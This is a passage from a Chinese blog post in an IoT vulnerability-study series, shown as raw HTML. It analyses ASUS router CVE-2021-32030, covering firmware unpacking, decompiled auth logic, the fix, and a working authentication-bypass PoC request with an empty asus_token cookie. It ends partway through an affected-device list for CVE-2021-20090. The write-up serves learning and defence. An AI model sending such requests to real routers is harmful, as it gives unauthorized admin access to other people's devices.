<li><a href="#dir320">DIR320</a></li>
<li><a href="#dir645">DIR645</a></li>
<li><a href="#cnvd-2018-01084">CNVD-2018-01084</a>
<ul>
<li><a href="#漏洞基本信息-3">漏洞基本信息</a></li>
<li><a href="#解包-3">解包</a></li>
<li><a href="#静态分析">静态分析</a></li>
<li><a href="#动态调试">动态调试</a></li>
<li><a href="#exp">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#dvrf项目">DVRF项目</a>
<ul>
<li><a href="#解包-4">解包</a></li>
<li><a href="#dvrf-stack_bof_01">DVRF stack_bof_01</a>
<ul>
<li><a href="#静态分析-1">静态分析</a></li>
<li><a href="#动态调试-1">动态调试</a></li>
<li><a href="#exp-1">exp</a></li>
</ul>
</li>
<li><a href="#dvrf-stack_bof_02">DVRF stack_bof_02</a>
<ul>
<li><a href="#静态分析-2">静态分析</a></li>
<li><a href="#动态调试-2">动态调试</a></li>
<li><a href="#exp-2">exp</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#tenda">Tenda</a>
<ul>
<li><a href="#cve-2018-5767">CVE-2018-5767</a>
<ul>
<li><a href="#漏洞基本信息-4">漏洞基本信息</a></li>
<li><a href="#漏洞分析-3">漏洞分析</a></li>
<li><a href="#漏洞复现-3">漏洞复现</a></li>
</ul>
</li>
<li><a href="#cve-202010987">CVE-2020–10987</a>
<ul>
<li><a href="#漏洞基本信息-5">漏洞基本信息</a></li>
<li><a href="#satc定位漏洞">SaTC定位漏洞</a></li>
<li><a href="#漏洞分析-4">漏洞分析</a></li>
</ul>
</li>
<li><a href="#cve-2023-30135">CVE-2023-30135</a>
<ul>
<li><a href="#漏洞基本信息-6">漏洞基本信息</a></li>
<li><a href="#漏洞分析-5">漏洞分析</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#trendnet">TRENDnet</a>
<ul>
<li><a href="#cve-2018-7034">CVE-2018-7034</a>
<ul>
<li><a href="#漏洞基本信息-7">漏洞基本信息</a></li>
<li><a href="#漏洞分析-6">漏洞分析</a></li>
<li><a href="#漏洞复现-4">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#huawei">HUAWEI</a>
<ul>
<li><a href="#cve-2017-17215">CVE-2017-17215</a>
<ul>
<li><a href="#漏洞基本信息-8">漏洞基本信息</a></li>
<li><a href="#解包-5">解包</a></li>
<li><a href="#漏洞分析-7">漏洞分析</a></li>
<li><a href="#漏洞复现-5">漏洞复现</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</nav>
</div>
</details>
<script>
  (function () {
    var $toc = $('#TableOfContents');
    if ($toc.length > 0) {
      var $window = $(window);

      function onScroll() {
        var currentScroll = $window.scrollTop();
        var h = $('.anchor');
        var id = "";
        h.each(function (i, e) {
          e = $(e);
          if (e.offset().top - $(window).height()/3 <= currentScroll) {
            id = e.attr('id');
          }
        });
        var active = $toc.find('a.active');      
        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;

        active.each(function (i, e) {
          
            $(e).removeClass('active');
          
        });
        $toc.find('a[href="#' + id + '"]').addClass('active')
        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
          $(e).children('a').parents('ul').show();          
        });
      }

      $window.on('scroll', onScroll);
      $(document).ready(function () {
        
        onScroll();
      });
    }
  })();
</script>
</div>
</div>
<div class="min-w-0 min-h-0 max-w-prose">
<details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" open="" style="margin-left:0px">
<summary class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
        IoT学习小记 - This article is part of a series.
    </summary>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<a href="https://ta0lve.github.io/posts/iot/0x01/">
            Part 1: IoT基础学习
        </a>
</div>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
        Part 2: This Article
    </div>
<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
<a href="https://ta0lve.github.io/posts/iot/0x03/">
            Part 3: IoT漏洞挖掘思路
        </a>
</div>
</details>
<div class="flex px-4 py-3 rounded-md bg-primary-100 dark:bg-primary-900">
<span class="text-primary-400 ltr:pr-3 rtl:pl-3 flex items-center">
<span class="relative block icon">
<svg viewbox="0 0 512 512" xmlns="http://www.w3.org/2000/svg"><path d="M506.3 417l-213.3-364c-16.33-28-57.54-28-73.98 0l-213.2 364C-10.59 444.9 9.849 480 42.74 480h426.6C502.1 480 522.6 445 506.3 417zM232 168c0-13.25 10.75-24 24-24S280 154.8 280 168v128c0 13.25-10.75 24-23.1 24S232 309.3 232 296V168zM256 416c-17.36 0-31.44-14.08-31.44-31.44c0-17.36 14.07-31.44 31.44-31.44s31.44 14.08 31.44 31.44C287.4 401.9 273.4 416 256 416z" fill="currentColor"></path></svg>
</span>
</span>
<span class="dark:text-neutral-300"><strong>如果本博客部分文章图片加载失败，</strong><a href="/posts/sth/sm.ms/">
<strong>可以点击此处查看解决办法</strong></a></span>
</div>
<p>漏洞基本信息格式：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">漏洞基本信息</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">漏洞编号</span><span class="err">：</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">漏洞类型</span><span class="err">：</span> 
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">漏洞利用效果</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">漏洞披露时间</span><span class="err">：</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">漏洞描述</span><span class="err">：</span> 
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">设备型号</span><span class="err">：</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">设备架构</span><span class="err">：</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">复现进度</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span>  <span class="nx">漏洞复现</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span>  <span class="nx">静态分析</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span>  <span class="nx">动态调试</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">受影响的漏洞组件</span> <span class="err">：</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">文件名</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">功能</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">技术栈</span><span class="err">：（</span><span class="nx">脚本语言</span><span class="err">）</span>
</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="nx">定位漏洞组件的方法和工具</span><span class="err">：</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">污点分析</span>
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">静态分析工具</span> 
</span></span><span class="line"><span class="cl">  <span class="o">-</span> <span class="nx">动态调试工具</span> 
</span></span></code></pre></div><div class="anchor" id="asus华硕"></div>
<h2 class="relative group">ASUS(华硕) 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#asus%e5%8d%8e%e7%a1%95" style="text-decoration-line: none !important;">#</a></span>
</h2>
<div class="anchor" id="cve-2021-32030"></div>
<h3 class="relative group">CVE-2021-32030 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2021-32030" style="text-decoration-line: none !important;">#</a></span>
</h3>
<p><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-32030" target="_blank">
    CVE - CVE-2021-32030 (mitre.org)</a></p>
<p><a href="https://github.com/atredispartners/advisories/blob/master/ATREDIS-2020-0010.md" target="_blank">
    advisories/ATREDIS-2020-0010.md at master · atredispartners/advisories (github.com)</a></p>
<div class="anchor" id="漏洞基本信息"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>漏洞编号：CVE-2021-32030</li>
<li>漏洞类型： 身份验证绕过</li>
<li>漏洞利用效果：对管理员界面的未经授权的访问</li>
<li>漏洞披露时间：20210505</li>
<li>漏洞描述：
<ul>
<li>ASUS GT-AC2900管理员应用程序在处理未经身份验证的用户的远程输入时，容易受到身份验证绕过漏洞的攻击，从而导致对管理员界面的未经授权的访问</li>
</ul>
</li>
<li>设备型号：低于 3.0.0.4.386.42643 的 ASUS GT-AC2900 设备</li>
<li>设备架构：ARM</li>
<li>复现进度：
<ul>
<li>已进行静态分析</li>
</ul>
</li>
<li>受影响的漏洞组件 ：
<ul>
<li>文件名：httpd</li>
<li>功能：用于处理用户发送的 HTTP 请求</li>
</ul>
</li>
<li>定位漏洞组件的方法和工具：
<ul>
<li>静态分析工具
<ul>
<li>ida(32位)</li>
<li>ghidra</li>
</ul>
</li>
</ul>
</li>
</ul>
<div class="anchor" id="解包"></div>
<h4 class="relative group">解包 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e8%a7%a3%e5%8c%85" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>固件下载链接：https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip</li>
<li>binwalk 解包之后得到一个 100000.ubi 文件</li>
<li>使用 ubi_reader 继续解包</li>
<li>在 /usr/sbin/ 目录下找到一个叫做 httpd 的程序
<ul>
<li>此程序用于处理用户发送的 HTTP 请求</li>
</ul>
</li>
</ul>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ wget https://dlcdnets.asus.com/pub/ASUS/wireless/RT-AX56U/FW_RT_AX56U_30043848253.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ unzip FW_RT_AX56U_30043848253.zip
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ <span class="nb">cd</span> Firmware_Release
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">➜  /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release ls
</span></span><span class="line"><span class="cl">RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ binwalk -Me RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">➜  /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted ls
</span></span><span class="line"><span class="cl">100000.ubi  ubifs-root
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ ubireader_extract_files 100000.ubi
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">➜  /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted ls ubifs-root/1589911850/rootfs_ubifs 
</span></span><span class="line"><span class="cl">bin    cifs2  debug  etc   jffs  mmc  opt   rom   sbin  sysroot  usr  www
</span></span><span class="line"><span class="cl">cifs1  data   dev    home  lib   mnt  proc  root  sys   tmp      var
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">➜  /home/iot/vul/ASUS/CVE-2021-32030/Firmware_Release/_RT-AX56U_3.0.0.4_384_8253-ga83822c_cferom_pureubi.w.extracted/ubifs-root/1589911850/rootfs_ubifs/usr/sbin ls <span class="p">|</span>grep http      
</span></span><span class="line"><span class="cl">httpd
</span></span><span class="line"><span class="cl">httpds
</span></span><span class="line"><span class="cl">lighttpd
</span></span><span class="line"><span class="cl">lighttpd-arpping
</span></span><span class="line"><span class="cl">lighttpd-monitor
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ file httpd
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">httpd: ELF 32-bit LSB executable, ARM, EABI5 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.3, <span class="k">for</span> GNU/Linux 4.1.0, stripped
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$ checksec httpd
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> <span class="s1">'httpd'</span>
</span></span><span class="line"><span class="cl">    Arch:     arm-32-little
</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
</span></span><span class="line"><span class="cl">    Stack:    No canary found
</span></span><span class="line"><span class="cl">    NX:       NX enabled
</span></span><span class="line"><span class="cl">    PIE:      No PIE <span class="o">(</span>0x10000<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">###</span>
</span></span></code></pre></div><div class="anchor" id="漏洞分析"></div>
<h4 class="relative group">漏洞分析 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>使用 IDA 分析程序
<ul>
<li>搜索 httpd_handle_request 字符串可找到处理请求的入口位置</li>
<li>httpd_handle_request 函数逻辑简述如下</li>
</ul>
</li>
</ul>
<p>首先对请求进行简单解析，利用 strncasecmp 等字符串操作函数从用户请求中匹配出一些结构，并将这些数据赋值到对应的变量。</p>
<p>
<figure>
<img alt="image-20240222165056036" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/muYUFNAofczy9pW.png"/>
</figure>
</p>
<p>然后过滤 URL，防止出现路径穿越。</p>
<p>
<figure>
<img alt="image-20240222165033016" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/QfOpcRPsvgVHXFl.png"/>
</figure>
</p>
<p>之后根据用户访问的 URL 和 Method 执行不同逻辑，但所有需要身份验证的接口都要经过函数 <code>auth_check(sub_5B560)</code>，此函数从 Cookie 中获取 asus_token 参数的值，然后带入 <code>sub_59588</code> 进行检查</p>
<p>
<figure>
<img alt="image-20240222165507029" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/wNJudYhWP42nBoL.png"/>
</figure>
</p>
<p>
<figure>
<img alt="image-20240222165146633" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/tSYVbFdLCGqMfTg.png"/>
</figure>
</p>
<p>我们注意到函数先从配置文件中获取 ifttt_token 参数的值，然后将 asus_token 和它比较，<strong>如果两者相等，则输出<code>IFTTT/ALEXA long token success.</code></strong></p>
<p><strong>同时返回 1，表示身份验证通过。</strong></p>
<p>
<figure>
<img alt="image-20240222170215469" class="my-0 rounded-md" src="https://s2.loli.net/2024/02/25/S2XHGWsrEeV7lwO.png"/>
</figure>
</p>
<p>但是在设备的默认配置下，IFTTT 功能没有开启，这<strong>导致 ifttt_token 默认值为空</strong>，</p>
<ul>
<li>此时如果用户传入的 asus_token 也是空值</li>
<li>则 strcmp 会返回 0 表示比较成功</li>
<li>这样就能绕过后续的检查，实现身份验证绕过。</li>
</ul>
<p>poc：</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="nx">GET</span> <span class="o">/</span><span class="nx">appGet</span><span class="p">.</span><span class="nx">cgi</span><span class="o">?</span><span class="nx">hook</span><span class="o">=</span><span class="nx">get_cfg_clientlist</span><span class="p">()</span> <span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
</span></span><span class="line"><span class="cl"><span class="nx">Host</span><span class="o">:</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.107</span><span class="o">:</span><span class="mi">8443</span>
</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Length</span><span class="o">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agent</span><span class="o">:</span> <span class="nx">asusrouter</span><span class="o">--</span>
</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
</span></span><span class="line"><span class="cl"><span class="nx">Referer</span><span class="o">:</span> <span class="nx">https</span><span class="o">:</span><span class="c1">//192.168.1.107:8443/
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Cookie</span><span class="o">:</span> <span class="nx">asus_token</span><span class="o">=</span><span class="err">\</span><span class="mi">0</span><span class="nx">Invalid</span><span class="p">;</span> <span class="nx">clickedItem_tab</span><span class="o">=</span><span class="mi">0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">HTTP</span><span class="o">/</span><span class="mf">1.0</span> <span class="mi">200</span> <span class="nx">OK</span>
</span></span><span class="line"><span class="cl"><span class="nx">Server</span><span class="o">:</span> <span class="nx">httpd</span><span class="o">/</span><span class="mf">2.0</span>
</span></span><span class="line"><span class="cl"><span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="o">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">json</span><span class="p">;</span><span class="nx">charset</span><span class="o">=</span><span class="nx">UTF</span><span class="o">-</span><span class="mi">8</span>
</span></span><span class="line"><span class="cl"><span class="nx">Connection</span><span class="o">:</span> <span class="nx">close</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="s2">"get_cfg_clientlist"</span><span class="o">:</span><span class="p">[{</span><span class="s2">"alias"</span><span class="o">:</span><span class="s2">"24:4B:FE:64:37:10"</span><span class="p">,</span><span class="s2">"model_name"</span><span class="o">:</span><span class="s2">"GT-AC2900"</span><span class="p">,</span><span class="s2">"ui_model_name"</span><span class="o">:</span><span class="s2">"GT-AC2900"</span><span class="p">,</span><span class="s2">"fwver"</span><span class="o">:</span><span class="s2">"3.0.0.4.386_41793-gdb31cdc"</span><span class="p">,</span><span class="s2">"newfwver"</span><span class="o">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"ip"</span><span class="o">:</span><span class="s2">"192.168.50.1"</span><span class="p">,</span><span class="s2">"mac"</span><span class="o">:</span><span class="s2">"24:4B:FE:64:37:10"</span><span class="p">,</span><span class="s2">"online"</span><span class="o">:</span><span class="s2">"1"</span><span class="p">,</span><span class="s2">"ap2g"</span><span class="o">:</span><span class="s2">"24:4B:FE:64:37:10"</span><span class="p">,</span><span class="s2">"ap5g"</span><span class="o">:</span><span class="s2">"24:4B:FE:64:37:14"</span><span class="p">,</span><span class="s2">"ap5g1"</span><span class="o">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"apdwb"</span><span class="o">:</span><span class="s2">""</span><span class="p">,</span><span class="s2">"wired_mac"</span><span class="o">:</span><span class="p">[</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">...</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>新版 auth_check 函数将代码修改为</p>
<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">a1</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="nf">nvram_safe_get_0</span><span class="p">(</span><span class="s">"ifttt_token"</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">v2</span> <span class="o">=</span> <span class="nf">nvram_safe_get_0</span><span class="p">(</span><span class="s">"ifttt_token"</span><span class="p">),</span> <span class="o">!</span><span class="nf">strcmp</span><span class="p">(</span><span class="n">a1</span><span class="p">,</span> <span class="n">v2</span><span class="p">))</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="nf">isFileExist</span><span class="p">(</span><span class="s">"/tmp/IFTTT_ALEXA"</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nf">Debug2File</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="s">"/tmp/IFTTT_ALEXA.log"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s">"[%s:(%d)][HTTPD] IFTTT/ALEXA long token success.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s">"check_ifttt_token"</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="mi">1020</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>首先判断 asus_token 是否为空，避免用户传入空值的情况出现，从而修复了此漏洞。</p>
<div class="anchor" id="漏洞复现"></div>
<h4 class="relative group">漏洞复现 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0" style="text-decoration-line: none !important;">#</a></span>
</h4>
<p>由于该设备我们<code>qemu</code>模拟的环境中是无法连接上的，由于之后还要发送数据，这里也不好直接<code>patch</code>，因此，在本地较难复现</p>
<p><del>使用 <code>shodan</code>（ <a href="https://www.shodan.io/" target="_blank">
    https://www.shodan.io/</a> ） 查找到还在用此路由器设备的站点</del></p>
<p>可以复现漏洞，但是这样做不太好（）</p>
<div class="anchor" id="cve-2021-20090"></div>
<h3 class="relative group">CVE-2021-20090 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#cve-2021-20090" style="text-decoration-line: none !important;">#</a></span>
</h3>
<div class="anchor" id="漏洞基本信息-1"></div>
<h4 class="relative group">漏洞基本信息 
    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e6%bc%8f%e6%b4%9e%e5%9f%ba%e6%9c%ac%e4%bf%a1%e6%81%af-1" style="text-decoration-line: none !important;">#</a></span>
</h4>
<ul>
<li>
<p>漏洞编号：CVE-2021-20090</p>
</li>
<li>
<p>漏洞类型： 身份验证绕过</p>
</li>
<li>
<p>漏洞利用效果：对管理员界面的未经授权的访问</p>
</li>
<li>
<p>漏洞披露时间：20201217</p>
</li>
<li>
<p>漏洞描述：</p>
<ul>
<li>Arcadyan制造的网络设备的Web界面中有一个路径遍历漏洞，可允许未经身份验证的远程攻击者绕过身份验证。</li>
<li>由于根本原因存在于底层 Arcadyan 固件，且有多个厂商采用了 Arcadyan 开发的系统套件，故CVE-2021-20090 影响很多设备</li>
</ul>
</li>
<li>
<p>设备型号：</p>
<ul>
<li>
<p>Buffalo WSR-2533DHPL2 固件版本 &lt;= 1.02 和 WSR-2533DHP3 固件版本 &lt;= 1.24</p>
</li>
<li>
<table>
<thead>
<tr>
<th><strong><code>Vendor</code></strong></th>
<th><strong><code>Device</code></strong></th>
<th><strong><code>Found on version</code></strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ADB</code></td>
<td><code>ADSL wireless IAD router</code></td>
<td><code>1.26S-R-3P</code></td>
</tr>
<tr>
<td><code>Arcadyan</code></td>
<td><code>ARV7519</code></td>
<td><code>00.96.00.96.617ES</code></td>
</tr>
<tr>
<td><code>Arcadyan</code></td>
<td><code>VRV9517</code></td>
<td><code>6.00.17 build04</code></td>
</tr>
<tr>
<td><code>Arcadyan</code></td>
<td><code>VGV7519</code></td>
<td><code>3.01.116</code></td>
</tr>
<tr>
<td><code>Arcadyan</code></td>
<td><code>VRV9518</code></td>
<td><code>1.01.00 build44</code></td>
</tr>
<tr>
<td><code>ASMAX</code></td>
<td><code>BBR-4MG / SMC7908 ADSL</code></td>
<td><code>0.08</code></td>
</tr>
<tr>
<td><code>ASUS</code></td>
<td><code>DSL-AC88U (Arc VRV9517)</code></td>
<td><code>1.10.05 build502</code></td>
</tr>
<tr>
<td><code>ASUS</code></td>
<td><code>DSL-AC87VG (Arc VRV9510)</code></td>
<td><code>1.05.18 build305</code></td>
</tr>
<tr>
<td><code>ASUS</code></td>
<td><code>DSL-AC3100</code></td>
<td><code>1.10.05 build503</code></td>
</tr>
<tr>
<td><code>ASUS</code></td>
<td><code>DSL-AC68VG</code></td>
<td><code>5.00.08 build272</code></td>
</tr>
<tr>
<td><code>Beeline</code></td>
<td><code>Smart Box Flash</code></td>
<td><code>1.00.13_beta4</code></td>
</tr>
<tr>
<td><code>British Telecom</code></td>
<td><code>WE410443-SA</code></td>
<td><code>1.02.12 build02</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>WSR-2533DHPL2</code></td>
<td><code>1.02</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>WSR-2533DHP3</code></td>
<td><code>1.24</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>BBR-4HG</code></td>
<td></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>BBR-4MG</code></td>
<td><code>2.08 Release 0002</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>WSR-3200AX4S</code></td>
<td><code>1.1</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>WSR-1166DHP2</code></td>
<td><code>1.15</code></td>
</tr>
<tr>
<td><code>Buffalo</code></td>
<td><code>WXR-5700AX7S</code></td>
<td><code>1.11</code></td>
</tr>
<tr>
<td><code>Deutsche Telekom</code></td>
<td><code>Speedport Smart 3</code></td>
<td><code>010137.4.8.001.0</code></td>
</tr>
<tr>
<td><code>HughesNet</code></td>
<td><code>HT2000W</code></td>
<td><code>0.10.10</code></td>
</tr>
<tr>
<td><code>KPN</code></td>
<td><code>ExperiaBox V10A (Arcadyan VRV9517)</code></td>
<td><code>5.00.48 build453</code></td>
</tr>
<tr>
<td><code>KPN</code></td>
<td><code>VGV7519</code></td>
<td><code>3.01.116</code></td>
</tr>
<tr>
<td><code>O2</code></td>
<td><code>HomeBox 6441</code></td>
<td><code>1.01.36</code></td>
</tr>
<tr>
<td><code>Orange</code></td>
<td><code>LiveBox Fibra (PRV3399)</code></td>
<td><code>00.96.00.96.617ES</code></td>
</tr>
<tr>
<td><code>Skinny</code></td>
<td><code>Smart Modem (Arcadyan VRV9517)</code></td>
<td><code>6.00.16 build01</code></td>
</tr>
<tr>
<td><code>SparkNZ</code></td>
<td><code>Smart Modem (Arcadyan VRV9517)</code></td>
<td><code>6.00.17 build04</code></td>
</tr>
<tr>
<td><code>Telecom (Argentina)</code></td>
<td><code>Arcadyan VRV9518VAC23-A-OS-AM</code></td>
<td><code>1.01.00 build44</code></td>
</tr>
<tr>
<td><code>TelMex</code></td>
<td><code>PRV33AC</code></td>
<td><code>1.31.005.0012</code></td>
</tr>
<tr>
<td><code>TelMex</code></td>
<td><code>VRV7006</code></td>
<td></td>
</tr>
<tr>
<td><code>Telstra</code></td>
<td><code>Smart Modem Gen 2 (LH1000)</code></td>
<td><code>0.13.01r</code></td>
</tr>
<tr>
<td><code>Telus</code></td>
<td><code>WiFi Hub (PRV65B444A-S-TS)</code></td>
<td><code>v3.00.20</code></td>
</tr>
<tr>
<td><code>Telus</code></td>
<td><code>NH20A</code></td>
<td><code>1.00.10debug build06</code></td>
</tr>
<tr>
<td><code>Verizon</code></td>
